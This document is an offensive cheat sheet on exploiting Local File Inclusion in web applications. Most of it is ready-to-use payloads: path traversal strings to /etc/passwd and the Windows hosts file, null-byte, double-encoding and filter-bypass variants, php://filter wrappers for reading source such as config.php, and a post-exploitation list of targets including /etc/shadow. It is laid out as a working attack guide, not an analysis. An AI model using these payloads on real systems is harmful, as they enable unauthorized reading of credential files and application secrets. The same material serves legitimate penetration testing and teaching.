# X - Local File Inclusion

The File Inclusion vulnerability allows for the include of a file locally
present on the server, usually exploiting a "dynamic file inclusion" mechanisms
implemented in the target application.  

The vulnerability occurs due to the use of user-supplied input without proper
validation.

### RECON

Look for scripts which take filenames as parameters, such as the following
examples:

```
http://vulnerable_host/preview.php?file=example.html
http://vulnerable_host/?op=home
```

Try to access common files, such as:

```
# Linux

# Windows
WINDOWS\System32\drivers\etc\hosts
```

<br />
### EXPLOIT

###### Basic

Typical proof-of-concept for basic LFI would be:

```
# Linux
?file=../../../../../../../../../../etc/passwd

# Windows
?file=..\..\..\..\..\..\..\..\..\..\WINDOWS\System32\drivers\etc\hosts
```

###### Null Byte
In some cases, the server will will include ".php‚Äù at the end of the requested
file.
Such mechanisms can be bypassed using the line terminator char *null byte*:

```
# Linux
?file=../../../../../../../../../../etc/passwd%00

# Windows
?file=..\..\..\..\..\..\..\..\..\..\WINDOWS\System32\drivers\etc\hosts%00
```

###### Double encoding
Encoding parameters twice in hexadecimal format can be leveraged to bypass
security controls such as blacklist filters.  
For example, the '.' (*dot*) character represent %2E in hexadecimal
representation. When the % symbol is encoded again, its representation in
hexadecimal code is %25. The result from the double encoding process is %252E.

```
# Linux
?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# Windows
?file=%252e%252e%255c%252e%252e%255c%252e%252e%255cWINDOWS%255cSystem32%255cdrivers%255cetc%255chosts
```

###### Filter bypass
Some blacklist filter may be implemented and restrict the usage of "../".  
Those kind of filter may be passed using the following payloads:

```
# Linux
?file=....//....//etc/passwd
?file=..///////..////..//////etc/passwd

# Windows
?file=....\\....\\....\\....\\....\\....\\WINDOWS\System32\drivers\etc\hosts%00
?file=..\\\\\\..\\\\\\..\\\\\\..\\\\\\..\\\\\\WINDOWS\System32\drivers\etc\hosts%00
```

###### PHP wrappers

**php://filter**
This PHP wrappers can be used to access the source code of the page:

```
# Base64 encoding
?page=php://filter/convert.base64-encode/resource=index
?page=php://filter/convert.base64-encode/resource=config.php

# rot13 encoding
?page=php://filter/read=string.rot13/resource=index
?page=php://filter/read=string.rot13/resource=config.php
```

<br />
### POST-EXPLOIT

###### Linux files

the following Linux files can be of interest:
```
# System information
/etc/issue

# System users account information
/etc/passwd

# System users account hashed password
/etc/shadow

# System grouops information
/etc/group


/etc/hosts
```
